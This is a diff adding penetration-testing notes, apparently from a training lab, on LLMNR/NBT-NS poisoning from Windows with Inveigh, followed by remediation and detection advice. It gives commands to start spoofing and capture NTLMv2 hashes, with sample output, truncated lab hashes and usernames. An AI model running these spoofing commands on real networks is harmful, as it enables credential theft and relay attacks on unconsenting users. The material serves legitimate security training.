@@ -95,4 +95,102 @@ Recovered........: 1/1 (100.00%) Digests
 
 ---
 
-This technique is often the first step in gaining a foothold for further enumeration and attacks in an AD environment. 
+
+## LLMNR/NBT-NS Poisoning - from Windows
+
+LLMNR & NBT-NS poisoning is possible from a Windows host as well. In this section, we use Inveigh (PowerShell and C#) to capture credentials, similar to Responder on Linux.
+
+---
+
+### Inveigh Overview
+- Inveigh is a MITM tool for spoofing/poisoning LLMNR, NBNS, mDNS, DNS, DHCPv6, HTTP, SMB, LDAP, and more.
+- Available in PowerShell and C# versions (InveighZero).
+- Can listen on IPv4/IPv6 and capture NTLM hashes and cleartext credentials.
+- Typically found in `C:\Tools` on the Windows attack host.
+
+---
+
+### Using Inveigh (PowerShell)
+```powershell
+# Import the module
+Import-Module .\Inveigh.ps1
+# List all parameters
+(Get-Command Invoke-Inveigh).Parameters
+# Start LLMNR/NBNS spoofing, output to console and file
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+**Sample Output:**
+```
+[*] Inveigh 1.506 started at ...
+[+] LLMNR Spoofer = Enabled
+[+] NBNS Spoofer For Types 00,20 = Enabled
+[+] SMB Capture = Enabled
+[+] HTTP Capture = Enabled
+[+] Output Directory = C:\Tools
+[+] File Output = Enabled
+[+] Console Output = Full
+... (hashes and requests captured)
+```
+
+---
+
+### Using Inveigh (C# / InveighZero)
+```powershell
+# Run the C# executable
+.\Inveigh.exe
+```
+**Sample Output:**
+```
+[*] Inveigh 2.0.4 [Started ...]
+[+] LLMNR Packet Sniffer [Type A]
+[+] HTTP Listener [HTTPAuth NTLM | Port 80]
+[+] SMB Packet Sniffer [Port 445]
+[+] File Output [C:\Tools]
+... (hashes and requests captured)
+```
+
+#### Interactive Console
+- Press `ESC` to enter/exit the interactive console.
+- Use commands like `GET NTLMV2UNIQUE` to view unique captured hashes, or `GET NTLMV2USERNAMES` to list usernames.
+
+---
+
+### Example: Captured Hashes and Usernames
+```
+backupagent::INLANEFREIGHT:B5013246091943D7:16A41B703C8D4F8F6AF75C47C3B50CB5:... (NTLMv2 hash)
+forend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:... (NTLMv2 hash)
+
+IP Address      Host                Username
+172.16.5.125    ACADEMY-EA-FILE     INLANEFREIGHT\backupagent
+172.16.5.125    ACADEMY-EA-FILE     INLANEFREIGHT\forend
+```
+
+---
+
+### Remediation
+- **Disable LLMNR:**
+  - Group Policy: Computer Configuration → Administrative Templates → Network → DNS Client → "Turn OFF Multicast Name Resolution"
+- **Disable NBT-NS:**
+  - Locally: Network Adapter Properties → IPv4 → Advanced → WINS → Disable NetBIOS over TCP/IP
+  - Or via PowerShell script:
+    ```powershell
+    $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
+    Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
+    ```
+- **Push via GPO:** Use a startup script in Group Policy to apply the above PowerShell script domain-wide.
+- **Other mitigations:**
+  - Filter/block LLMNR/NetBIOS traffic
+  - Enable SMB Signing
+  - Use IDS/IPS and network segmentation
+
+---
+
+### Detection
+- Monitor for traffic on UDP 5355 (LLMNR) and 137 (NBT-NS)
+- Watch for Windows Event IDs 4697 and 7045
+- Monitor registry key `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` for `EnableMulticast` changes
+- Use honeytokens (fake LLMNR/NBT-NS requests) to detect spoofing responses
+
+---
+
+LLMNR/NBT-NS poisoning from Windows is just as effective as from Linux. Inveigh provides a powerful, flexible way to capture credentials and hashes for offline cracking or relay attacks. Always ensure you have authorization and operate within scope.
